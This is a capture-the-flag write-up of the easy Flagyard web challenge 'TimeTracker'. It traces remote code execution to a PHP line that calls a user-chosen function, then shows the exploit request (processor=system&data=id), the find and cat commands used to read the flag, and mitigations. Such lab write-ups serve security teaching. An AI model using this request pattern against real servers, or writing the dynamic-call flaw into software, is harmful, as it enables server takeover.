# TimeTracker (Flagyard)

> **Platform:** Flagyard  
> **Category:** Web Security  
> **Difficulty:** Easy

## Challenge Overview

The objective of this challenge was to assess a web-based employee time tracking application for security vulnerabilities.

## Skills Demonstrated

- Source Code Review
- Authentication Analysis
- Remote Code Execution (RCE)
- Linux Enumeration
- PHP Security
- Command Execution

---

# Vulnerability Analysis

During source code review, I discovered that the application dynamically executed PHP functions based on user input.

```php
$processor($data);
```

Since both the function name and its argument were fully controlled by the user, this resulted in a **Remote Code Execution (RCE)** vulnerability.

---

# Exploitation

After authenticating with the discovered credentials, I tested command execution.

Request:

```
?action=process_data&processor=system&data=id
```

Output:

```
uid=1000 gid=1000 groups=1000
```

This confirmed arbitrary command execution.

---

# Enumeration

Locate the flag:

```
find / -name flag.txt
```

Result:

```
/app/flag.txt
```

Read the flag:

```
cat /app/flag.txt
```

---

# Root Cause

The application trusted user input and directly executed arbitrary PHP functions without validation.

```php
$processor($data);
```

This allowed attackers to execute operating system commands on the server.

---

# Impact

- Remote Code Execution
- Arbitrary command execution
- Access to sensitive files
- Complete compromise of the application

---

# Mitigation

- Remove dynamic function execution.
- Use a strict whitelist of allowed functions.
- Validate all user input.
- Remove hardcoded credentials.
- Follow the principle of least privilege.

---
